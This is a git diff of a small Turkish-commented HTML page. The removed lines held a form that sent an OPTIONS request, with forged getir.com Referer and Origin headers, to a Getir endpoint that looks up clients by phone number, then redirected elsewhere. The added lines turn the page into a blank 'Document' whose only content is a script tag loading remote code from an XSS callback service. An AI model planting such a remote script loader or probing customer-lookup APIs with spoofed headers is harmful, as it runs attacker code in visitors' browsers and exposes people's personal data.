@@ -1,53 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>HTTP Form Gönderimi</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 <body>
-  <form id="myForm">
-    <input type="text" id="inputData" name="inputData">
-    <button type="button" onclick="submitForm()">Gönder</button>
-  </form>
-
-  <script>
-    function submitForm() {
-  var inputData = document.getElementById('inputData').value;
-  var url = 'https://food-client-api-gateway.getirapi.com/clients/by-gsm/?countryCode=90&gsm=' + encodeURIComponent(inputData); // İsteğin gönderileceği URL
-
-  var httpRequest = new XMLHttpRequest();
-  httpRequest.onreadystatechange = function() {
-    if (httpRequest.readyState === XMLHttpRequest.DONE) {
-      if (httpRequest.status === 200) {
-        console.log('İstek başarılı!');
-      } else {
-        console.log('İstek başarısız!');
-      }
-    }
-  };
-
-  // OPTIONS isteği oluştur
-  httpRequest.open('OPTIONS', url, true);
-  httpRequest.setRequestHeader('Accept', '*/*');
-  httpRequest.setRequestHeader('Accept-Language', 'en-US,en;q=0.8,tr-TR;q=0.5,tr;q=0.3');
-  httpRequest.setRequestHeader('Accept-Encoding', 'gzip, deflate, br');
-  httpRequest.setRequestHeader('Access-Control-Request-Method', 'GET');
-  httpRequest.setRequestHeader('Access-Control-Request-Headers', 'content-type,language');
-  httpRequest.setRequestHeader('Referer', 'https://getir.com/');
-  httpRequest.setRequestHeader('Origin', 'https://getir.com');
-  httpRequest.setRequestHeader('Sec-Fetch-Dest', 'empty');
-  httpRequest.setRequestHeader('Sec-Fetch-Mode', 'cors');
-  httpRequest.setRequestHeader('Sec-Fetch-Site', 'cross-site');
-  httpRequest.setRequestHeader('Te', 'trailers');
-  httpRequest.setRequestHeader('Connection', 'close');
-
-  httpRequest.send(); // İsteği gönder
-
-  // İstek gönderildikten sonra belirli bir süre bekleyerek sayfayı yönlendir
-  setTimeout(function() {
-    window.location.href = 'https://horizonhn.github.io/sayfa2.html';
-  }, 1000); // Örnek olarak 1 saniye (1000 milisaniye) bekleyelim
-}
-  </script>
+    <script src=https://xss.report/c/fatkz></script>
 </body>
 </html>
